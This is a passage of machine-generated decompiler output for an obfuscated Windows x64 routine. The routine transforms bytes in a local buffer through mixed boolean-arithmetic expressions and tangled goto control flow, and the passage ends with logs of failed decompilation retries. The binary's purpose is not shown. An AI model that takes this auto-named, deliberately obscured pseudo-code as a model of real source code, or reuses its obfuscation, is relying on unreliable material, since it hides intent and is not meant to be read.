    puVar14 = (undefined4 *)(auStackY_5f8 + 0x926bbe);
    goto LAB_1400220e6;
  }
  if (uVar23 + 1 <= uVar20) {
    if (uVar20 == uVar23 + 1) {
      cVar6 = ('\x11' - (cVar6 + 0xb2U & bVar7)) * '\x02' + cVar6 + 0xb2U;
      goto LAB_140022080;
    }
    if (uVar20 == uVar23 + 2) {
      bVar21 = (bVar7 + cVar6 + 0x4aU + (cVar6 + 0x4aU & bVar7) * -2) - 6;
      goto LAB_140021ffb;
    }
    if (uVar20 == uVar23 + 3) {
      cVar6 = cVar6 + 0x16U + ('3' - (cVar6 + 0x16U & bVar7)) * '\x02';
      goto LAB_140021fcc;
    }
    if (uVar20 != uVar23 + 7) {
      if (uVar20 != uVar23 + 4) goto LAB_140021730;
      cVar22 = cVar6 + (cVar6 + 0x12U & bVar7) * -2 + -0x6c;
      goto LAB_140021f66;
    }
    bVar21 = ('\x12' - (cVar6 + 0x7aU & bVar7)) * '\x02' + cVar6 + bVar7;
    goto LAB_1400216a3;
  }
  bVar21 = bVar7 + (bVar7 & cVar6 - 0x1aU) * -2 + -0x4a + (cVar6 - 0x1aU);
LAB_140021730:
  if (uVar16 < uVar23) {
    puVar14 = (undefined4 *)(auStackY_5f8 + 0x155a4d8);
    goto LAB_1400220e6;
  }
  if (uVar23 + 1 <= uVar20) {
    if (uVar20 != uVar23 + 1) {
      if (uVar20 == uVar23 + 3) {
        cVar22 = cVar6 + (cVar6 + 0xeU & bVar7) * -2 + -0x54;
LAB_140021f0e:
        bVar21 = cVar22 + bVar7;
        goto LAB_140021f11;
      }
      if (uVar20 != uVar23 + 2) goto LAB_140021780;
      cVar6 = ('\x0e' - (cVar6 + 0xa6U & bVar7)) * '\x02' + cVar6;
      goto LAB_140021fcc;
    }
    cVar22 = ('\x02' - (cVar6 + 0xaaU & bVar7)) * '\x02' + cVar6;
    goto LAB_140021f66;
  }
  bVar21 = cVar6 + (cVar6 - 0x22U & bVar7) * -2 + -0x34 + bVar7;
LAB_140021780:
  while (uVar17 = uVar23, uVar16 < uVar23 + uVar20) {
    while( true ) {
      do {
        uVar23 = uVar17;
        if (uVar20 == uVar23 + 5) {
          cVar22 = ('\x04' - (cVar6 - 0x2cU & bVar7)) * '\x02' + cVar6;
          goto LAB_140021f66;
        }
        if (uVar20 == uVar23 + 0x200) {
          bVar21 = (' ' - (cVar6 + 0xa0U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar23 + 1;
          goto LAB_1400216a3;
        }
        if (uVar20 == uVar23 + 0x1000) {
          bVar21 = ('<' - (cVar6 + 0x6cU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_1400216a3;
        }
        if (uVar20 == uVar23 + 8) {
          cVar22 = cVar6 + (cVar6 + 0x38U & bVar7) * -2 + -0x50;
          goto LAB_140021f0e;
        }
        if (uVar20 == uVar23 + 0x10) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 4U & bVar7) * -2) - 0x18;
          uVar20 = uVar20 + uVar23;
          goto LAB_140021fcf;
        }
        if (uVar20 == uVar23 + 0x7a) {
          cVar6 = ('\x10' - (cVar6 - 0x30U & bVar7)) * '\x02' + cVar6;
          goto LAB_140021fcc;
        }
        if (uVar20 == uVar23 + 0x2a) {
          bVar21 = (',' - (cVar6 + 0x9cU & bVar7)) * '\x02' + cVar6 + bVar7;
          goto LAB_140021ffb;
        }
        if (uVar20 == uVar23 + 0x28) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0x68U & bVar7) * -2 + 0x90;
          goto LAB_140022028;
        }
        if (uVar20 == uVar23 + 100) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x34U & bVar7) * -2) - 0x38;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x40] + uVar23 + 1;
          goto LAB_1400216a3;
        }
        uVar17 = uVar23;
      } while (uVar20 == uVar23 + 2);
      uVar20 = uVar23 + 9;
      uVar17 = uVar23 + 0x4b;
      if (uVar20 < uVar23 + 0x6b) {
        bVar21 = (bVar7 + cVar6 + (cVar6 + 0xb2U & bVar7) * -2) - 0x2c;
        goto LAB_140021690;
      }
      if (uVar20 < uVar23 + 0x8c) {
        bVar21 = ('\x06' - (cVar6 + 0x7eU & bVar7)) * '\x02' + cVar6 + bVar7;
        goto LAB_1400216a0;
      }
      if (uVar20 < uVar23 + 0x4c) {
        bVar21 = ('\"' - (cVar6 + 0x4aU & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar23 = uVar17;
        goto LAB_1400216c0;
      }
      if (uVar20 < uVar23 + 0x8b) {
        bVar21 = ('>' - (cVar6 + 0x16U & bVar7)) * '\x02' + cVar6 + bVar7;
        uVar23 = uVar17;
        goto LAB_140021730;
      }
      if (uVar20 < uVar23 + 0x75) break;
      if (uVar20 < uVar23 + 0x4e) {
        cVar22 = cVar6 + (cVar6 + 0xaeU & bVar7) * -2 + -0x14;
        uVar23 = uVar17;
        goto LAB_140021b50;
      }
      if (uVar20 < uVar23 + 0xaf) {
        bVar21 = cVar6 + 0x7a;
        cVar22 = '\x12';
        uVar23 = uVar17;
        goto LAB_140021b02;
      }
      if (uVar20 < uVar23 + 0x433) {
        cVar22 = ('.' - (cVar6 + 0x46U & bVar7)) * '\x02' + cVar6;
        uVar23 = uVar17;
        goto LAB_140021acf;
      }
      if (uVar20 < uVar23 + 0x50) {
        bVar21 = bVar7 + cVar6 + (cVar6 + 0x12U & bVar7) * -2 + 0x94;
        uVar23 = uVar17;
        goto LAB_140021aac;
      }
      if (uVar23 + 0x54 <= uVar20) {
        uVar20 = uVar23 + 0x8d;
        uVar17 = uVar23 + 0x108d;
        if (uVar23 + 0x108e < uVar20) {
          bVar21 = bVar7 + cVar6 + (cVar6 + 0x90U & bVar7) * -2 + 0xa0;
          uVar16 = uVar16 + (byte)local_368[uVar16 - 0x40] + uVar17 + 1;
          uVar23 = uVar17;
          goto LAB_1400216a3;
        }
        if (uVar23 + 0x1091 < uVar20) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x5cU & bVar7) * -2) - 0x28;
          uVar23 = uVar17;
          goto LAB_140022028;
        }
        if (uVar23 + 0x110d < uVar20) {
          bVar21 = ('\b' - (cVar6 + 0x28U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar17;
          goto LAB_140021ffb;
        }
        if (uVar23 + 0x148d < uVar20) {
          cVar6 = ('$' - (cVar6 - 0xcU & bVar7)) * '\x02' + cVar6;
          uVar23 = uVar17;
          goto LAB_140021fcc;
        }
        if (uVar23 + 0x1093 < uVar20) {
          bVar21 = bVar7 + cVar6 + (cVar6 - 0x40U & bVar7) * -2 + 0x80;
          uVar20 = uVar20 + uVar17;
          uVar23 = uVar17;
          goto LAB_140021fcf;
        }
        if (uVar23 + 0x1097 < uVar20) {
          cVar22 = cVar6 + (cVar6 + 0x8cU & bVar7) * -2 + -0x48;
          uVar23 = uVar17;
          goto LAB_140021f0e;
        }
        if (uVar23 + 0x10ee < uVar20) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x58U & bVar7) * -2) - 0x10;
          uVar23 = uVar17;
          goto LAB_1400216a3;
        }
        if (uVar23 + 0x1096 < uVar20) {
          bVar21 = ('\x14' - (cVar6 + 0x24U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar23 = uVar23 + 0x108e;
          goto LAB_1400216a3;
        }
        if (uVar23 + 0x10ad < uVar20) {
          cVar22 = ('0' - (cVar6 - 0x10U & bVar7)) * '\x02' + cVar6;
          uVar23 = uVar17;
          goto LAB_140021f66;
        }
        if (uVar20 <= uVar23 + 0x10ce) {
          uVar20 = uVar23 + 0x208d;
          uVar17 = uVar23 + 0x208e;
        }
      }
    }
    bVar21 = cVar6 + (cVar6 - 0x1eU & bVar7) * -2 + -0x4c + bVar7;
    uVar23 = uVar17;
  }
  if (uVar20 < uVar23 + 0x10) {
    cVar22 = cVar6 + (cVar6 - 0x1aU & bVar7) * -2 + -100;
LAB_140021b50:
    bVar21 = cVar22 + bVar7;
LAB_140021b53:
    if (uVar23 + uVar20 != 4) {
      if (uVar23 + 0x10 < uVar20) {
        bVar21 = cVar6 - 0x32;
        cVar22 = '\x16';
LAB_140021b02:
        bVar21 = (cVar22 - (bVar21 & bVar7)) * '\x02' + cVar6 + bVar7;
LAB_140021b0d:
        if (uVar20 < 0x400) {
          if (uVar23 + 0x80 < uVar20) {
            cVar22 = cVar6 + (cVar6 + 0xacU & bVar7) * -2 + -8;
LAB_140021acf:
            bVar21 = cVar22 + bVar7;
          }
          else {
            if (uVar20 == uVar23 + 1) {
              cVar6 = ('\x18' - (cVar6 + 0x78U & bVar7)) * '\x02' + cVar6;
LAB_140022080:
              bVar21 = cVar6 + bVar7;
              uVar16 = uVar16 + (byte)local_368[uVar16 - 0x40] + uVar23 + 1;
              goto LAB_1400216a3;
            }
            if (uVar20 == uVar23 + 2) {
              bVar21 = bVar7 + cVar6 + (cVar6 + 0x10U & bVar7) * -2 + 0xa0;
              goto LAB_140021ffb;
            }
            if (uVar20 == uVar23 + 5) {
              bVar21 = ('\b' - (cVar6 + 0xa8U & bVar7)) * '\x02' + cVar6 + bVar7;
              uVar20 = uVar20 + uVar23;
              goto LAB_140021fcf;
            }
            if (uVar20 == uVar23 + 3) {
              bVar21 = bVar7 + cVar6 + (cVar6 + 0x40U & bVar7) * -2 + 0x80;
              goto LAB_1400216a3;
            }
          }
          if (0x29 < uVar23) {
            bVar21 = (('\x14' - (cVar6 + 0xa4U & bVar7)) * '\x02' + cVar6 + bVar7) * '\x02';
            goto LAB_140021f69;
          }
LAB_140021aac:
          local_368[uVar16 - 0x40] = bVar21;
          uVar16 = uVar16 + 1;
          goto LAB_1400216a3;
        }
        bVar21 = ((bVar7 - (cVar6 + 0x70U & bVar7)) + '0') * '\x02' + cVar6;
LAB_140021f11:
        local_368[uVar16 - 0x40] =
             cVar6 + 0x56U + (cVar6 + 0x56U & bVar7) * -2 + -0x5a + bVar7 + bVar21;
        uVar20 = uVar20 + uVar23;
      }
      else {
        if (uVar20 == uVar23 + 1) {
          cVar22 = ('2' - (cVar6 + 0x9aU & bVar7)) * '\x02' + cVar6;
          goto LAB_140021f66;
        }
        if (uVar20 == uVar23 + 2) {
          bVar21 = (bVar7 + cVar6 + (cVar6 + 0x32U & bVar7) * -2) - 0x2c;
          goto LAB_1400216a3;
        }
        if (uVar20 == uVar23 + 3) {
          bVar21 = ('\"' - (cVar6 - 0x36U & bVar7)) * '\x02' + cVar6 + bVar7;
          uVar20 = uVar20 + uVar23;
        }
        else {
          if (uVar20 != uVar23 + 6) {
            if (uVar20 != uVar23 + 2) {
              if (uVar20 != uVar23 + 9) goto LAB_140021b0d;
              cVar6 = ('\x12' - (cVar6 - 6U & bVar7)) * '\x02' + cVar6;
              goto LAB_140022080;
            }
            bVar21 = bVar7 + cVar6 + (cVar6 + 0x62U & bVar7) * -2 + 0xb4;
            goto LAB_140021ffb;
          }
          cVar6 = ('>' - (cVar6 + 0x96U & bVar7)) * '\x02' + cVar6;
LAB_140021fcc:
          bVar21 = cVar6 + bVar7;
        }
      }
LAB_140021fcf:
      uVar16 = uVar16 - bVar21;
      goto LAB_1400216a3;
    }
    bVar21 = cVar6 + (cVar6 + 0x3cU & bVar7) * -2 + 0x98;
  }
  else {
    if (uVar20 == uVar23 + 1) {
      bVar21 = bVar7 + cVar6 + (cVar6 + 0xbcU & bVar7) * -2 + 0x98;
      uVar16 = uVar16 + (byte)local_368[uVar16 - 0x40] + uVar23 + 1;
      goto LAB_1400216a3;
    }
    if (uVar20 != uVar23 + 3) {
      if (uVar20 == uVar23 + 5) {
        bVar21 = (bVar7 + cVar6 + (cVar6 + 0x84U & bVar7) * -2) - 0x18;
      }
      else {
        if (uVar20 != uVar23 + 2) goto LAB_140021b53;
        cVar22 = (',' - (cVar6 + 0x1cU & bVar7)) * '\x02' + cVar6;
LAB_140021f66:
        bVar21 = cVar22 + bVar7;
LAB_140021f69:
        local_368[uVar16 - 0x40] =
             ('\x1d' - (cVar6 + 0x8aU & bVar7)) * '\x02' + cVar6 + 0x8aU + bVar7;
        uVar23 = uVar23 + 1;
      }
      goto LAB_1400216a3;
    }
    bVar21 = ('\x04' - (cVar6 + 0x54U & bVar7)) * '\x02' + cVar6 + bVar7;
  }
LAB_140021ffb:
  bVar11 = ('\t' - (cVar6 + 0x22U & bVar7)) * '\x02' + cVar6 + 0x22U + bVar7;
  local_368[uVar16 - 0x40] = bVar11;
  uVar16 = uVar16 - ((ulonglong)bVar11 + uVar23 + 1);
  uVar23 = uVar23 + 1;
LAB_140022028:
  bVar11 = (char)uVar16 + 8;
  local_368[uVar16 - 0x40] = bVar11 + (bVar11 & bVar7) * -2 + -0x38 + bVar7;
  uVar20 = uVar20 + 1;
  lVar15 = uVar16 + (-1 - uVar20);
  uVar16 = lVar15 + (byte)local_368[lVar15 + -0x40] + uVar23 + 1;
  goto LAB_1400216a3;
}



/* ==================================================================== */
/* 140027570 / FUN_140027570 */
/* RETRY FAILED: Exception while decompiling 140027570: process: timeout
 */

/* ==================================================================== */
/* 140039f40 / FUN_140039f40 */
/* RETRY FAILED: Exception while decompiling 140039f40: process: timeout
 */

/* Retry summary: recovered=1, attempted=3 */
